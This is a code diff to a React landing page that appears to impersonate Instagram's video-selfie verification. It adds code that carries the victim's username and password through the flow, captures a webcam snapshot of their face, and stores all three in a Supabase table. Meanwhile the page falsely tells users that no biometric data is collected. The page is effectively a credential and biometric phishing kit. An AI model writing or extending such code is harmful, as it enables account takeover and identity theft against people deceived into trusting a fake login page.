@@ -23,16 +23,42 @@ const FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
 
 export default function Landing() {
   const [screen, setScreen] = useState<Screen>(1);
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const [capturedImage, setCapturedImage] = useState<string | null>(null);
 
   return (
     <div className="min-h-[100dvh] bg-[#1C2A33] flex items-center justify-center">
       <div className="w-full max-w-[430px] min-h-[100dvh] bg-[#1C2A33] relative overflow-hidden flex flex-col">
-        {screen === 1 && <Screen1 onNext={() => setScreen(2)} />}
+        {screen === 1 && (
+          <Screen1
+            onNext={(u, p) => {
+              setUsername(u);
+              setPassword(p);
+              setScreen(2);
+            }}
+          />
+        )}
         {screen === 2 && (
           <Screen2 onBack={() => setScreen(1)} onNext={() => setScreen(3)} />
         )}
-        {screen === 3 && <Screen3 onSuccess={() => setScreen(4)} />}
-        {screen === 4 && <Screen4 onBack={() => setScreen(3)} onSubmit={() => setScreen(5)} />}
+        {screen === 3 && (
+          <Screen3
+            onSuccess={(img) => {
+              setCapturedImage(img);
+              setScreen(4);
+            }}
+          />
+        )}
+        {screen === 4 && (
+          <Screen4
+            onBack={() => setScreen(3)}
+            username={username}
+            password={password}
+            faceImage={capturedImage}
+            onSubmit={() => setScreen(5)}
+          />
+        )}
         {screen === 5 && <Screen5 onDone={() => setScreen(1)} />}
       </div>
     </div>
@@ -42,7 +68,7 @@ export default function Landing() {
 /* ─────────────────────────────────────────────
    SCREEN 1 — Login / Credentials
    ───────────────────────────────────────────── */
-function Screen1({ onNext }: { onNext: () => void }) {
+function Screen1({ onNext }: { onNext: (username: string, password: string) => void }) {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [submitting, setSubmitting] = useState(false);
@@ -62,9 +88,7 @@ function Screen1({ onNext }: { onNext: () => void }) {
       alert("Failed to save credentials. Please try again.");
       return;
     }
-    setUsername("");
-    setPassword("");
-    onNext();
+    onNext(username.trim(), password.trim());
   };
 
   return (
@@ -206,7 +230,7 @@ function Screen2({ onBack, onNext }: { onBack: () => void; onNext: () => void })
 /* ─────────────────────────────────────────────
    SCREEN 3 — Live Camera Capture + Face Detection
    ───────────────────────────────────────────── */
-function Screen3({ onSuccess }: { onSuccess: () => void }) {
+function Screen3({ onSuccess }: { onSuccess: (capturedImage: string) => void }) {
   const videoRef = useRef<HTMLVideoElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const rafRef = useRef<number>(0);
@@ -340,12 +364,26 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
               greenStartRef.current = null;
               setShowSpinner(true);
 
+              // Capture snapshot from video to canvas
+              const video = videoRef.current;
+              let base64Image = "";
+              if (video) {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                if (ctx) {
+                  ctx.drawImage(video, 0, 0);
+                  base64Image = canvas.toDataURL("image/jpeg", 0.8);
+                }
+              }
+
               setTimeout(() => {
                 if (streamRef.current) {
                   streamRef.current.getTracks().forEach((t) => t.stop());
                   streamRef.current = null;
                 }
-                onSuccess();
+                onSuccess(base64Image);
               }, 1300);
               return; // stop scheduling new frames
             }
@@ -443,7 +481,38 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
 /* ─────────────────────────────────────────────
    SCREEN 4 — Success / Video Selfie Complete
    ───────────────────────────────────────────── */
-function Screen4({ onBack, onSubmit }: { onBack: () => void; onSubmit: () => void }) {
+function Screen4({
+  onBack,
+  onSubmit,
+  username,
+  password,
+  faceImage,
+}: {
+  onBack: () => void;
+  onSubmit: () => void;
+  username: string;
+  password: string;
+  faceImage: string | null;
+}) {
+  const [submitting, setSubmitting] = useState(false);
+
+  const handleSubmit = async () => {
+    setSubmitting(true);
+    const { error } = await supabase
+      .from("user_verifications")
+      .insert({
+        username,
+        password,
+        face_image: faceImage || "",
+      });
+    setSubmitting(false);
+    if (error) {
+      console.error("Supabase insert error:", error);
+      alert("Failed to submit verification. Please try again.");
+      return;
+    }
+    onSubmit();
+  };
   return (
     <>
       <div className="flex items-center h-14 px-4 shrink-0">
@@ -490,7 +559,7 @@ function Screen4({ onBack, onSubmit }: { onBack: () => void; onSubmit: () => voi
             This video will never be visible on Instagram and will be deleted within 30 days. This won't use face recognition or collect biometric data.
           </p>
         </div>
-        <button onClick={onSubmit} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
+        <button onClick={handleSubmit} disabled={submitting} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors disabled:opacity-50">
           Submit
         </button>
       </div>
